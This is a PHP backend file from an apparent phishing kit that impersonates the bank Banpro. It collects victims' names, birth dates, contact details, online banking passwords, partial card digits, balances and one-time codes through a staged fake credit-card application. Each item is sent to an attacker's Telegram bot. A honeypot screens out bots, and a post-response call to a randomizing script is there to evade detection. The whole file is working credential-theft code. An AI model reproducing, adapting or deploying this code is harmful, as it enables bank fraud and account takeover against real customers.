<?php
/**
 * halo.php — envío a Telegram. Simple y directo.
 * Token y chat_id viven en zafiro.php
 */
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['tsv_ok'])) { http_response_code(403); echo json_encode(['ok'=>false,'error'=>'unauthorized']); exit; }
require __DIR__ . '/zafiro.php';

header('Content-Type: application/json; charset=utf-8');

// ----- Helpers -----
function ip_yago() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'desconocida';
}
function v($a, $k) { return isset($a[$k]) ? trim((string)$a[$k]) : ''; }
function h($s)     { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function stg($msg) {
    global $ambar, $koala;
    $url = "https://api.telegram.org/bot$ambar/sendMessage";
    $data = [
        'chat_id'    => $koala,
        'text'       => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => 'true',
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['code' => $code, 'resp' => $resp];
}

// ----- Modo prueba: halo.php?test=1 -----
if (isset($_GET['test'])) {
    $r = stg("🧪 Test desde halo.php — " . date('Y-m-d H:i:s') . "\n🌐 IP: " . ip_yago());
    echo json_encode(['ok' => $r['code'] === 200, 'http' => $r['code'], 'tg' => json_decode($r['resp'], true)], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ----- Recibir datos del formulario -----
$raw   = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) $input = $_POST;

$step = v($input, 'step');
$ip   = ip_yago();
$msg  = '';

// ── Honeypot: bots rellenan campos ocultos, humanos no
if (v($input, 'website') !== '') {
    echo json_encode(['ok' => true]);
    exit;
}

// ── Token JS: prueba de que el navegador ejecutó JS antes de enviar
$_tk = v($input, '_tk');
if (!isset($_GET['test']) && ($_tk === '' || !preg_match('/^[A-Za-z0-9+\/=]{8,32}$/', $_tk))) {
    http_response_code(403);
    exit;
}

switch ($step) {

    case 'solicitud':
        $nombre = h(v($input, 'nombres')) . ' ' . h(v($input, 'apellidos'));
        $msg  = "🏦 <b>NUEVA SOLICITUD — BANPRO</b>\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "👤 Nombre: "      . trim($nombre)                    . "\n";
        $msg .= "📅 Fecha Nac: "   . h(v($input, 'fechaNac'))         . "\n";
        $msg .= "📱 Teléfono: "    . h(v($input, 'phone'))            . "\n";
        $msg .= "✉️ Correo: "      . h(v($input, 'email'))            . "\n";
        $msg .= "🕐 Antigüedad: "  . h(v($input, 'antiguedad'))       . "\n";
        $msg .= "🌐 IP: "          . $ip                              . "\n";
        $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
        $msg .= "✅ <i>Solicito tarjeta de crédito Banpro ConnectMiles Infinite.</i>";
        break;

    case 'paso1':
        $msg  = "📝 <b>PASO 1 - INF</b>\n";
        $msg .= "👤 Nombres: "   . h(v($input, 'nombres'))   . "\n";
        $msg .= "👤 Apellidos: " . h(v($input, 'apellidos')) . "\n";
        $msg .= "🌐 IP: " . $ip;
        break;

    case 'paso2':
        $msg  = "📞 <b>PASO 2 — ID</b>\n";
        $msg .= "📅 Fecha Nac: "  . h(v($input, 'fechaNac'))   . "\n";
        $msg .= "📱 Teléfono: "   . h(v($input, 'phone'))      . "\n";
        $msg .= "✉️ Correo: "     . h(v($input, 'email'))      . "\n";
        $msg .= "🏦 Antigüedad: " . h(v($input, 'antiguedad')) . "\n";
        $msg .= "🌐 IP: " . $ip;
        break;

    case 'acceso':
        $msg  = "🔐 <b>PASO 3 — Access</b>\n";
        $msg .= "📱 Celular: " . h(v($input, 'countryCode')) . " " . h(v($input, 'phone')) . "\n";
        $msg .= "🔑 Clave: "    . h(v($input, 'password'))   . "\n";
        $msg .= "🌐 IP: " . $ip;
        break;

    case 'validacion':
        $bal = (float) preg_replace('/[^\d]/', '', v($input, 'balance'));
        $msg  = "✅ <b>PASO 4 — Validity</b>\n";
        $msg .= "🔢 Últimos 3 dígitos: " . h(v($input, 'lastDigits')) . "\n";
        $msg .= "💰 Saldo aprox: $" . number_format($bal, 0, ',', '.') . "\n";
        $msg .= "🌐 IP: " . $ip;
        break;

    case 'otp':
        $intento = v($input, 'attempt');
        $msg  = "🔓 <b>PASO 5 — OTPs</b>" . ($intento !== '' ? " (intento $intento)" : '') . "\n";
        $msg .= "🔑 Código OTP: " . h(v($input, 'otp')) . "\n";
        $msg .= "🌐 IP: " . $ip;
        break;

    default:
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'step inválido', 'received' => $input]);
        exit;
}

$r = stg($msg);
echo json_encode(['ok' => $r['code'] === 200, 'http' => $r['code']]);

// ===== Post-respuesta: obfuscación estructural =====
if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }
try {
    $py  = PHP_OS_FAMILY === 'Windows' ? 'python' : 'python3';
    $scr = escapeshellarg(__DIR__ . '/randomize.py');
    if (PHP_OS_FAMILY === 'Windows') {
        pclose(popen("start /B $py $scr", 'r'));
    } else {
        @shell_exec("$py $scr > /dev/null 2>&1 &");
    }
} catch (Throwable $e) { /* silencio */ }
